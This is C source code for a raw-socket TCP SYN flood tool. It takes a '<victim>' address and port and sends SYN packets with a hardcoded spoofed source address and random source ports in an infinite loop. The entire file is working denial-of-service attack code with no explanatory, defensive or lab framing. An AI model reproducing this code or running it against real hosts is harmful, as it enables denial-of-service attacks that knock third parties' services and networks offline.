#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>

unsigned short checksum(unsigned short *ptr,int nbytes) {
    long sum = 0;
    while(nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if(nbytes == 1) sum += *(unsigned char*)ptr;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int main(int c, char *v[]) {
    if(c < 3) { printf("Usage: %s <victim> <port>\n", v[0]); return 0; }

    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s < 0) { perror("socket"); return 1; }

    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(atoi(v[2]));
    sin.sin_addr.s_addr = inet_addr(v[1]);

    char packet[4096];

    while(1) {
        memset(packet,0,4096);

        struct iphdr *ip = (struct iphdr*) packet;
        struct tcphdr *tcp = (struct tcphdr*) (packet + sizeof(struct iphdr));

        ip->ihl = 5;
        ip->version = 4;
        ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        ip->ttl = 255;
        ip->protocol = IPPROTO_TCP;
        ip->saddr = inet_addr("10.0.0.3");
        ip->daddr = sin.sin_addr.s_addr;
        ip->check = checksum((unsigned short*)packet, 20);

        tcp->source = htons(rand() % 65535);
        tcp->dest = sin.sin_port;
        tcp->seq = htonl(rand());
        tcp->doff = 5;
        tcp->syn = 1;
        tcp->window = htons(1024);

        sendto(s, packet, ntohs(ip->tot_len), 0,
            (struct sockaddr*)&sin, sizeof(sin));
    }
}

